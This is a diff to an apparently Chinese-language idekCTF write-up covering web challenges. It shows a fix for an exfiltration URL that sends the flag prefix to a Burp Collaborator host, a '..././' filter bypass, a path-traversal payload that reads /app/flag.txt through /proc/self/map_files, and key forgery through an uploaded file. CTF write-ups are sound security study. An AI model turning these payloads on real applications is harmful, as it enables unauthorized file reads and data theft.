@@ -533,7 +533,7 @@ http://fancy-notes.chal.idek.team/fancy?q=Note+1&style=2
 http://fancy-notes.chal.idek.team/fancy?q=idekctf{&image=http://5agyjdbu3db0w6e7n60w52wbq2wskh.burpcollaborator.net/
 ```
 
-不够并没有这么轻松，app.py中限制了除q参数以外的参数字符不超过1，如何绕过呢？
+不过并没有这么轻松，app.py中限制了除q参数以外的参数字符不超过1，如何绕过呢？
 
 肥肠的鸡贼，在fancy.html中引入了一个外部的js脚本
 
@@ -744,7 +744,7 @@ def cleanup():
 '/etc/passwd'
 ```
 
-上传的文件名是直接拼在`os.path.join`中的，过滤了`../`，我们可以使用`..././`的方式来绕过（过滤之后拼起来正好是`../`，可以做到路径穿越，不过文件名还会有一个`_`下划线，我们的穿越目标路径需要本身就带有下划线使其不穿帮，我们选择`/proc/self/map_files`
+上传的文件名是直接拼在`os.path.join`中的，过滤了`../`，我们可以使用`..././`的方式来绕过（过滤之后拼起来正好是`../`，可以做到路径穿越，不过文件名还会有一个`_`下划线，我们的穿越目标路径需要本身就带有下划线使其不穿帮，我们选择`/proc/self/map_files`（选择`/usr/local/lib/python3.8/http/__pycache__`也是可以滴）
 
 验证cookie是否合法的时候是在文件上传之后的事情，所以我们可以用我们上传的文件做public.key
 
@@ -783,6 +783,10 @@ output/../../../../../proc/self/map_files/../../../app/flag.txt
 这样在下载时就做到了任意文件读取，得到flag
 
 ————肥肠巧妙的思路了！之前做jwt相关的题固定套路都是ssti获取key，伪造cookie就好了，而这个跟文件还有结合，之前没见过
+
+————有一个我忽略的点：由于是先保存文件再校验 所以不用管传上去报不报错都会被留存，然鹅然鹅，都有了`embed_file`函数来直接获得隐写的文件了。。。。😅小丑竟是我自己
+
+参考：[wp](https://fireshellsecurity.team/idekctf-writeups/#steghide-as-a-service)
 
 ## Misc/Profanity Check
 
